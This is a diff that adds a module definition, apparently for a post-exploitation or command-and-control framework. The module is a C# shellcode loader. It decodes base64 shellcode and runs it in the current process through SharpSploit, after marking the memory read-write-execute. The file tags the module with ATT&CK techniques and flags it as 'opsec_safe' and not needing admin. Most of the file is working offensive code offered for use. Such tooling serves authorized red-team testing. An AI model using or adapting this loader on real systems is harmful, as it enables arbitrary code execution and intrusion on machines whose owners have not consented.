@@ -1,0 +1,122 @@
+name: Shellcode
+authors:
+  - name: Anthony Rose
+    handle: Cx01N
+    link: https://twitter.com/Cx01N_
+description: |
+  This Module executes a provided shellcode file by creating a pinned area
+  of memory within the current process. The provided file is expected to be in a binary
+  format. The module modifies the memory with VirtualProtect to Read, Write, Execute.
+  The module takes no command line inputs.
+software: ''
+tactics: [TA0002]
+techniques: [T1106, T1620]
+background: false
+output_extension:
+needs_admin: false
+opsec_safe: true
+language: csharp
+min_language_version: ''
+options:
+  - name: File
+    description: Shellcode file to execute.
+    required: true
+    type: file
+csharp:
+  UnsafeCompile: false
+  CompatibleDotNetVersions:
+    - Net35
+    - Net40
+  Code: |
+    using System;
+    using System.IO;
+    using SharpSploit.Execution;
+
+    public static class Program
+    {
+        public static void Main(string[] args)
+        {
+            string shellcodeBase64 = args.Length > 0 ? args[0] : "";
+            string result = ExecuteShellcode(shellcodeBase64);
+            Console.WriteLine(result);
+        }
+
+        public static string ExecuteShellcode(string shellcodeBase64)
+        {
+            using (StringWriter stringWriter = new StringWriter())
+            {
+                try
+                {
+                    byte[] shellcode = Convert.FromBase64String(shellcodeBase64);
+                    if (ShellCode.ShellCodeExecute(shellcode))
+                    {
+                        stringWriter.WriteLine("Shellcode execution succeeded!");
+                    }
+                    else
+                    {
+                        stringWriter.WriteLine("Shellcode execution failed.");
+                    }
+                }
+                catch (Exception e)
+                {
+                    stringWriter.WriteLine(e.GetType().FullName + ": " + e.Message + Environment.NewLine + e.StackTrace);
+                }
+
+                return stringWriter.ToString();
+            }
+        }
+    }
+  ReferenceSourceLibraries:
+    - Name: SharpSploit
+      Description: SharpSploit is a library for C# post-exploitation modules.
+      Location: SharpSploit\SharpSploit\
+      Language: CSharp
+      CompatibleDotNetVersions:
+        - Net35
+        - Net40
+      ReferenceAssemblies:
+        - Name: System.Management.Automation.dll
+          Location: net35\System.Management.Automation.dll
+          DotNetVersion: Net35
+        - Name: System.Management.dll
+          Location: net40\System.Management.dll
+          DotNetVersion: Net40
+        - Name: System.Management.Automation.dll
+          Location: net40\System.Management.Automation.dll
+          DotNetVersion: Net40
+        - Name: System.IdentityModel.dll
+          Location: net40\System.IdentityModel.dll
+          DotNetVersion: Net40
+        - Name: System.dll
+          Location: net40\System.dll
+          DotNetVersion: Net40
+        - Name: System.DirectoryServices.dll
+          Location: net40\System.DirectoryServices.dll
+          DotNetVersion: Net40
+        - Name: System.Core.dll
+          Location: net40\System.Core.dll
+          DotNetVersion: Net40
+        - Name: mscorlib.dll
+          Location: net40\mscorlib.dll
+          DotNetVersion: Net40
+        - Name: System.Management.dll
+          Location: net35\System.Management.dll
+          DotNetVersion: Net35
+        - Name: mscorlib.dll
+          Location: net35\mscorlib.dll
+          DotNetVersion: Net35
+        - Name: System.Core.dll
+          Location: net35\System.Core.dll
+          DotNetVersion: Net35
+        - Name: System.DirectoryServices.dll
+          Location: net35\System.DirectoryServices.dll
+          DotNetVersion: Net35
+        - Name: System.dll
+          Location: net35\System.dll
+          DotNetVersion: Net35
+        - Name: System.IdentityModel.dll
+          Location: net35\System.IdentityModel.dll
+          DotNetVersion: Net35
+      EmbeddedResources: []
+  ReferenceAssemblies: []
+  EmbeddedResources: []
